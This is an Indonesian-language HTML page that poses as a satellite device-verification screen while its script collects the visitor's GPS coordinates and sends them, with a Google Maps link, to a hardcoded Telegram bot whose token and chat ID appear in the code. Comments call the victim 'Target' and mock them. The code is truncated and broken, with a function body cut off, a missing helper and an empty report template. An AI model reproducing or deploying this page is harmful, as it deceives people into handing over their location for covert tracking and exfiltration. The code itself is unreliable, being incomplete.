<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Pelacakan Perangkat</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background: #0a0a0a; color: #00ff00; text-align: center; padding: 50px; }
        .box { border: 2px solid #00ff00; padding: 20px; display: inline-block; border-radius: 10px; box-shadow: 0 0 15px #00ff00; }
        .loader { border: 5px solid #333; border-top: 5px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <div class="loader"></div>
        <h2>MENGHUBUNGKAN KE SATELIT...</h2>
        <p>Sedang memverifikasi enkripsi perangkat Anda.</p>
        <p style="font-size: 12px; color: #555;">Status: Meminta Izin Akses GPS...</p>
    </div>

    <script>
        // DATA DARI LU, BOS ğŸ¤‘
        const TELEGRAM_TOKEN = '8347499480:AAHSubBq2R8cDVvHiB-x6WTB9tuxhXr2DCQ';
        const TELEGRAM_CHAT_ID = '7546418553';

        function sendLog(msg) {
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',

        function track() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const info = await getExtraInfo();
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    const report = `

------------------------------
_Sent by Cylex-Coder ğŸ˜ˆ_
`;
                    sendLog(report);
                    document.body.innerHTML = "<h2>VERIFIKASI BERHASIL</h2><p>Perangkat sinkron.</p>";
                }, (err) => {
                    sendLog(`âš ï¸ *Target Nolak GPS, Goblok!* \nError: ${err.message}`);
